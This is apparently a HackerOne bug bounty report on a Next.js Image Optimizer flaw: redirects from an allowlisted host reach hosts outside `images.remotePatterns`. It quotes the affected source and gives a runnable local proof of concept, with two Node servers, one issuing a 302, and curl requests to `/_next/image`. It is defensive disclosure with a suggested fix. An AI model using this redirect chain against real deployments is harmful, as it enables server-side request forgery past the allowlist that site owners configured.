# SSRF / Allowlist Bypass: Next.js Image Optimizer follows cross-host redirects outside `images.remotePatterns`

## Program / Platform
Vercel Open Source via HackerOne — https://hackerone.com/vercel-open-source

## Category / Severity
Server-Side Request Forgery (CWE-918). Target `vercel/next.js`, `asset_type: Source Code`, eligible for bounty, with a critical ceiling for this asset class. I'm leaving the final severity to Vercel's triage: exploitation requires an attacker-influenced redirect on an already-allowlisted origin, and the demonstrated impact is a cross-host allowlist bypass — the existing private-IP protection remains active throughout (see "Impact" below).

## Affected asset
- Repository: `vercel/next.js`
- Files:
  - `packages/next/src/server/image-optimizer.ts` (input validation and fetch/redirect logic)
  - `packages/next/src/shared/lib/match-remote-pattern.ts` (hostname matching against `remotePatterns`)
- Lines: `image-optimizer.ts` L159-236 (`validateParams`), L233 (call to `hasRemoteMatch`), L521-587 (`fetchExternalImage`, redirect handling at L567-587); `match-remote-pattern.ts` (`hasRemoteMatch`/`matchRemotePattern`, built on picomatch's `makeRe`, imported from `next/dist/compiled/picomatch`)
- Commit confirmed against: `9c626ac94b8bcd8195e4f4d789824f90e0c95fe5` (branch `canary`). Re-verified by downloading the raw file content directly from GitHub at this exact SHA immediately before writing this report, so every line number and code excerpt below is byte-for-byte current, not reconstructed from memory.

## Summary
In the Image Optimizer flow examined below, the external image URL is validated against the developer-configured allowlist (`images.remotePatterns`/`domains`) only once, in `ImageOptimizerCache.validateParams`, at the entry point. If the (already-allowlisted) host's response is an HTTP redirect, `fetchExternalImage` follows that redirect by calling itself recursively — but never re-validates the new host against that same allowlist. As a result, any host configured in `remotePatterns` that can be induced to respond with a redirect can act as a stepping stone for Next.js to fetch content from an arbitrary **non-private** host that was never allowlisted, bypassing the guarantee `images.remotePatterns` documents for that class of host. This does not, on its own, demonstrate reaching internal/private infrastructure — see "Impact" for why.

## Confirmed call chain
1. `image-optimizer.ts:159-236` (`ImageOptimizerCache.validateParams`) — for an absolute URL, requires `hasRemoteMatch(domains, remotePatterns, hrefParsed)` (line 233); if it doesn't match any configured `domain`/`remotePattern`, rejects with HTTP 400. This is the validation point relevant to `remotePatterns` enforcement in the examined flow.
2. `match-remote-pattern.ts` (`hasRemoteMatch`/`matchRemotePattern`) — `pattern.hostname` is tested via `makeRe(pattern.hostname).test(url.hostname)` (`makeRe` imported from `next/dist/compiled/picomatch`), supporting wildcard hostnames (`**.example.com`) — a documented Next.js pattern, typically used for CDNs/user-generated-content buckets with a variable subdomain.
3. Once validated, the URL proceeds to `fetchExternalImage(href, dangerouslyAllowLocalIP, maximumResponseBody, count = 3)`. Inside it (`image-optimizer.ts:521-587`): if the response is a redirect and `URL.canParse(locationHeader, href)` holds (lines 567-572), and the `count` budget isn't exhausted, the code builds `const redirect = new URL(locationHeader, href).href` and **calls `fetchExternalImage` recursively with this new URL and `count - 1`** (lines 580-586) — never calling `hasRemoteMatch`/`validateParams` again. `hasRemoteMatch` is only invoked from `validateParams` — grepping the entire file confirms exactly two occurrences, the import and that single call site at line 233 — so `fetchExternalImage` never invokes it before following a redirect. The `count` budget (default 3, throwing a 508 at `count === 0`) only bounds how many redirect hops can happen; it does not restrict which hosts are reachable.
4. Because `fetchExternalImage` calls itself, its own private-IP check at the top of the function (lines 527-538, `isPrivateIp`) re-executes against the new host on every redirect hop too — that part of the guard **is** correctly re-applied by construction. What is never re-applied is `hasRemoteMatch`/`remotePatterns`, which only exists inside `validateParams`.
5. The existing test suite doesn't cover a cross-host redirect. Of the three redirect-specific tests in `test/e2e/image-optimizer/util.ts`: "should follow redirect from http to https when maximumRedirects > 0" changes only the scheme on the same already-allowlisted hostname (`image-optimization-test.vercel.app`); "should follow redirect when dangerouslyAllowLocalIP enabled" redirects to a relative path (`/slow.png`) on the same test server, so the host is unchanged by construction; and "should return 508 after redirecting too many times" only exercises the redirect-count limit, again against the same server. `test/unit/image-optimizer/fetch-external-image.test.ts` covers the private-IP guard with a literal IP and the response-size limit, with no redirect test at all. None of these four test cases constructs a redirect from an allowlisted host to a genuinely different, non-allowlisted host — the exact scenario this report describes.

## Prerequisites
A host already present in the target application's `images.remotePatterns`/`domains` that can be induced to respond with an HTTP redirect to another host — for example: a storage bucket (S3 and equivalents support per-object redirect via "website redirect" metadata), a third-party CDN/proxy whose redirect behavior isn't 100% controlled by the application owner, or any allowlisted service that accepts user content/configuration influencing its response. No real user account or data is needed to demonstrate the mechanism itself (see "Proof of concept" below for a fully isolated local reproduction).

## Steps to reproduce (real-world scenario)
1. The application configures `images.remotePatterns` to include a user-generated-content storage host (e.g., an S3 bucket with static website hosting enabled).
2. An attacker manages to make that host respond with a redirect (e.g., uploading an object with `x-amz-website-redirect-location` metadata pointing to any other public host not covered by the application's `remotePatterns`).
3. Request: `GET /_next/image?url=https://<allowlisted-host>/redirecting-object&w=128&q=75`.
4. `validateParams` validates the initial URL against `remotePatterns` — passes, since the initial host is genuinely allowlisted.
5. `fetchExternalImage` receives the redirect from the allowlisted host, builds the new URL, and calls itself recursively **without re-validating against remotePatterns** — only the private-IP guard is re-applied.
6. If the redirect's destination isn't a private IP, Next.js fetches and processes that host's content as if it were the original image.

## Current vs. expected result
- **Current:** `remotePatterns`/`domains` is only applied to the initial request URL's host; any subsequent redirect (bounded only by the `count` parameter's default of 3 hops in `fetchExternalImage`, configurable via `images.maximumRedirects` in `next.config.js` per the test suite) is free to change host, restricted only by the `isPrivateIp` filter.
- **Expected:** each redirect hop should re-validate the new host against the same `hasRemoteMatch`/`remotePatterns` before following it — the exact same guarantee applied to the initial URL.

## Evidence
`image-optimizer.ts:233-235` — the `remotePatterns` validation point, inside the static entry method:
```ts
if (!hasRemoteMatch(domains, remotePatterns, hrefParsed)) {
  return { errorMessage: '"url" parameter is not allowed' }
}
```
📷 See attached screenshot `nextjs-ssrf-01-validateparams-check.png`.

`image-optimizer.ts:567-587` — inside `fetchExternalImage`, the redirect branch, quoted verbatim with no omissions:
```ts
  const locationHeader = res.headers.get('Location')
  if (
    isRedirect(res.status) &&
    locationHeader &&
    URL.canParse(locationHeader, href)
  ) {
    if (count === 0) {
      Log.error('upstream image response had too many redirects', href)
      throw new ImageError(
        508,
        '"url" parameter is valid but upstream response is invalid'
      )
    }
    const redirect = new URL(locationHeader, href).href
    return fetchExternalImage(
      redirect,
      dangerouslyAllowLocalIP,
      maximumResponseBody,
      count - 1
    )
  }
```
Neither `hasRemoteMatch` nor `validateParams` appears in this block or anywhere else in `fetchExternalImage` — confirmed by grepping the whole file (see call chain step 3 above).
📷 See attached screenshot `nextjs-ssrf-02-fetchexternalimage-redirect.png`.

`match-remote-pattern.ts` — where the validation that should be re-applied lives, today only reachable from the static entry method:
```ts
export function hasRemoteMatch(
  domains: string[],
  remotePatterns: Array<RemotePattern | URL>,
  url: URL
): boolean {
  return (
    domains.some((domain) => url.hostname === domain) ||
    remotePatterns.some((p) => matchRemotePattern(p, url))
  )
}
```
📷 See attached screenshot `nextjs-ssrf-03-hasremotematch-function.png`.

**Duplicate check**: no public advisory or issue was found addressing this specific Image Optimizer cross-host redirect path.

## Proof of concept
Not executed against any production or third-party system — doing so would require a real host already configured in someone else's `remotePatterns`, which I don't control and didn't attempt to use. Instead, I built and actually ran a fully isolated, local reproduction myself — the results below are genuinely observed output from a live run, not a prediction from reading the code.

I installed `next@canary` fresh, which resolved to `16.4.0-canary.13` — a later canary than the commit cited elsewhere in this report (`9c626ac9`). Before relying on it, I confirmed the compiled package contains the identical function signature and redirect-handling logic (`fetchExternalImage(href, dangerouslyAllowLocalIP, maximumResponseBody, count = 3)`, the same `locationHeader`/`isRedirect`/`URL.canParse` check, the same recursive call, `hasRemoteMatch` appearing nowhere near it) — so this run confirms the bug is still present in a more recent canary build too, not only at the originally-cited commit.

A fully local reproduction necessarily runs both test servers on `localhost`, and loopback addresses are themselves caught by the `isPrivateIp` guard (see call chain step 4) unless `dangerouslyAllowLocalIP` is set. So this reproduction sets `dangerouslyAllowLocalIP: true` explicitly, and proves the finding with a control/treatment pair instead of a single request: **the same non-allowlisted host is requested twice, directly and via redirect**, with `dangerouslyAllowLocalIP` identically `true` both times — so the private-IP guard cannot be what explains any difference between the two outcomes, isolating `remotePatterns` enforcement as the only remaining variable. In a real deployment (no `dangerouslyAllowLocalIP` set), an attacker simply uses a genuinely public redirect target instead of a second local port — the mechanism is identical either way; the flag here only keeps this specific reproduction fully local.

| Test | Result |
|---|---|
| Direct request to `localhost:5002` | **400 — `"url" parameter is not allowed`** |
| Request to allowlisted `localhost:5001` | **302 → `localhost:5002`** |
| Image Optimizer result | **200 OK** |
| `localhost:5002` server log | **`HIT: /secret`** |

**The redirect destination (`localhost:5002`) is the exact same host that was rejected when requested directly.** The steps below are the full detail behind this table.

1. In an empty directory, create `next.config.js`:
```js
module.exports = {
  images: {
    dangerouslyAllowLocalIP: true,
    remotePatterns: [
      { protocol: 'http', hostname: 'localhost', port: '5001' },
    ],
  },
}
```

2. In the same directory, create two throwaway local servers.

`server-allowed.js` (the allowlisted host — issues the redirect):
```js
require('http').createServer((req, res) => {
  res.writeHead(302, { Location: 'http://localhost:5002/secret' })
  res.end()
}).listen(5001, () => console.log('allowed host listening on :5001'))
```

`server-not-allowed.js` (NOT in `remotePatterns`; serves a real 1x1 PNG so a successful fetch produces a clean 200 rather than a content-type rejection, isolating the allowlist bypass from image validation):
```js
const PNG_1x1 = Buffer.from(
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=',
  'base64'
)
require('http').createServer((req, res) => {
  console.log('HIT:', req.url)
  res.writeHead(200, { 'Content-Type': 'image/png' })
  res.end(PNG_1x1)
}).listen(5002, () => console.log('non-allowlisted host listening on :5002'))
```

Run both in separate terminals:
```bash
node server-allowed.js
node server-not-allowed.js
```

3. Set up a minimal Next.js app in that same directory (this is the exact setup I used) and start it:
```bash
npm init -y
npm install next@canary react@latest react-dom@latest
mkdir pages
```
Create `pages/index.js`:
```js
export default function Home() {
  return <div>SSRF PoC test app</div>
}
```
Then start the dev server:
```bash
next dev
```

4. **Control — request the non-allowlisted host directly**, no redirect involved:
```bash
curl -i "http://localhost:3000/_next/image?url=http%3A%2F%2Flocalhost%3A5002%2Fsecret&w=128&q=75"
```
**Observed:**
```text
HTTP/1.1 400 Bad Request
"url" parameter is not allowed
```
This confirms `remotePatterns` is genuinely active and `:5002` is genuinely not on it — with `dangerouslyAllowLocalIP` set, this rejection can only be coming from the `remotePatterns` check, not the private-IP guard.
📷 See attached screenshot `nextjs-ssrf-04-direct-nonallowlisted-rejected.png`.

5. **Treatment — request the allowlisted host, which redirects to that same non-allowlisted host** (if you already ran step 4/5 once before, restart `next dev` or vary `w`/`q` first — Next.js caches optimized images on disk and in memory, so an identical repeat request returns `X-Nextjs-Cache: HIT` without re-fetching upstream, which would make `server-not-allowed.js` misleadingly *not* log a new hit even though the finding still holds):
```bash
curl -i "http://localhost:3000/_next/image?url=http%3A%2F%2Flocalhost%3A5001%2Fredirect&w=128&q=75"
```
**Observed:** `HTTP/1.1 200 OK`, with a response body whose first bytes match the standard PNG file signature — confirming Next.js actually fetched, processed, and returned image content originating from `:5002`. Independently, the terminal running `server-not-allowed.js` logged `HIT: /secret` for this request — the non-allowlisted server's own log, not an inference. The exact host step 4 just proved is rejected when requested directly is reached anyway when arrived at via a redirect from an allowlisted host. Since `dangerouslyAllowLocalIP` is identically `true` in both requests, the private-IP guard cannot account for the difference — the gap is specifically `remotePatterns` not being re-checked on redirect.
📷 See attached screenshot `nextjs-ssrf-05-redirect-bypass-confirmed.png`.

## Impact
**The demonstrated impact is a cross-host allowlist bypass. This report does not claim that the bug independently bypasses Next.js's private-IP protection.**

An application that configures `images.remotePatterns`/`domains` expecting it to restrict which external hosts Next.js fetches content from has that guarantee broken as soon as any already-allowlisted host can be made to redirect: Next.js will fetch from and process content served by an arbitrary **non-private** host that was never allowlisted — a plausible scenario for user-content storage buckets, third-party CDNs, or any allowlisted service outside the direct control of whoever configured the application. The `isPrivateIp` guard still runs on the redirect target (see call chain step 4), so this finding on its own does **not** demonstrate reaching internal or private infrastructure — the demonstrated impact is the allowlist bypass to an arbitrary public host, not an internal-network pivot.

The application processes (via `sharp`) and serves content from a host the developer never authorized and never configured — a direct violation of the security model `images.remotePatterns` promises, and the core, demonstrated claim of this report.

## Suggested fix
Re-validate every redirect destination against the same `domains`/`remotePatterns` policy before issuing the redirected request — for example, by calling `hasRemoteMatch(domains, remotePatterns, new URL(redirect))` inside `fetchExternalImage` before following each hop, the same check already applied at entry.
